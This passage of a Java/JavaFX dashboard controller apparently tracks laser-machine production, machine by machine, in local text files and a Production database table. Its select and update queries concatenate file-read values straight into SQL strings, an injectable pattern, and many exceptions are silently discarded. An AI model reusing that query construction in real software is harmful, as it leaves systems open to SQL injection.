           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine2.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
               areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine2.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine2.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.WRITE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine2.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine2.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe2.txt"));
             summe2=Integer.parseInt(wq.readLine());
             wq.close();
             
             
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine2.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog11.setText(Integer.toString(sum-summe2));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  
               

//nog11.setText("N/A");
//nog11.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane2.setStyle("-fx-background-color:orange;");
              eff11.setText("0%");
          }
          
          else {
              
                vboxpane2.setStyle("-fx-background-color:transparent;");
              
                  
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff11.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff11.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff11.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff11.setText("N/A");
          }
              
          }
          
        
          /////////////////////////////////////////////////////////////////////////////////////////////  
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
          // buffr.close();
           } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg2.delete();
        }  
           
            workingmachinesno=workingmachinesno+1;
            
        }
        
        
        
    else { 
        /////////////////////// Machine 2 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno11.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno11.setText("Machine   "+machine_number2);
        nog11.setText("0");
        eff11.setText("0%");
        mod11.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod11.setText("Machine isn't working");
        unit11.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit11.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh11.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
//        
//    }
//    }).start(); 
//    
// 
//    
    
    
    
    
    
    
    
    
    
    
    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
          
    refresh12.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 3 ////////////////////////////
      String machine_number3="3";  
//      String poth3 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth3=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg3=new File (poth+"\\Machine3.kady");
        if (lkg3.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg3));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno12.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod12.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit12.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod12.setText(v5);
           unit12.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine3.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
              areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine3.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine3.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.WRITE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine3.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine3.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe3.txt"));
             summe3=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine3.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog12.setText(Integer.toString(sum-summe3));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  
     

//nog12.setText("N/A");
//nog12.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));


               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          //////////////////////////////////Create Performance Here////////////////////////////////////
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane3.setStyle("-fx-background-color:orange;");
              eff12.setText("0%");
          }
          
          else {
              
                vboxpane3.setStyle("-fx-background-color:transparent;");
              
                 
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff12.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff12.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff12.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff12.setText("N/A");
          }
              
          }
          
          
         
          /////////////////////////////////////////////////////////////////////////////////////////////
          
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg3.delete();
        } 
            
         workingmachinesno=workingmachinesno+1;   
            
        }
    else { 
        /////////////////////// Machine 3 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno12.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno12.setText("Machine   "+machine_number3);
        nog12.setText("0");
        eff12.setText("0%");
        mod12.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod12.setText("Machine isn't working");
        unit12.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit12.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh12.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  
        
        
//    }
//    }).start(); 
//    
//  
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
          
    refresh13.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 4 ////////////////////////////
      String machine_number4="4";  
//      String poth4 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth4=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg4=new File (poth+"\\Machine4.kady");
        if (lkg4.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg4));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno13.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod13.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit13.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod13.setText(v5);
           unit13.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine4.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine4.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine4.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine4.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine4.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe4.txt"));
             summe4=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine4.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog13.setText(Integer.toString(sum-summe4));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog13.setText("N/A");
//nog13.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane4.setStyle("-fx-background-color:orange;");
              eff13.setText("0%");
          }
          
          else {
              
                vboxpane4.setStyle("-fx-background-color:transparent;");
              
                  
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff13.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff13.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff13.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff13.setText("N/A");
          }
              
          }
          
          
        
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg4.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
            
            
            
        }
    else { 
        /////////////////////// Machine 4 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno13.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno13.setText("Machine   "+machine_number4);
        nog13.setText("0");
        eff13.setText("0%");
        mod13.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod13.setText("Machine isn't working");
        unit13.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit13.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh13.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  
        
        
        
//    }
//    }).start(); 
//    
//    
//  
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    refresh14.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 5 ////////////////////////////
      String machine_number5="5";  
//      String poth5 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth5=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
  File lkg5=new File (poth+"\\Machine5.kady");
        if (lkg5.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg5));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno14.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod14.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit14.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod14.setText(v5);
           unit14.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine5.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
             areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine5.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine5.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine5.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine5.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe5.txt"));
             summe5=Integer.parseInt(wq.readLine());
             wq.close();
             
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine5.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog14.setText(Integer.toString(sum-summe5));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }

//nog14.setText("N/A");
//nog14.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane5.setStyle("-fx-background-color:orange;");
              eff14.setText("0%");
          }
          
          else {
              
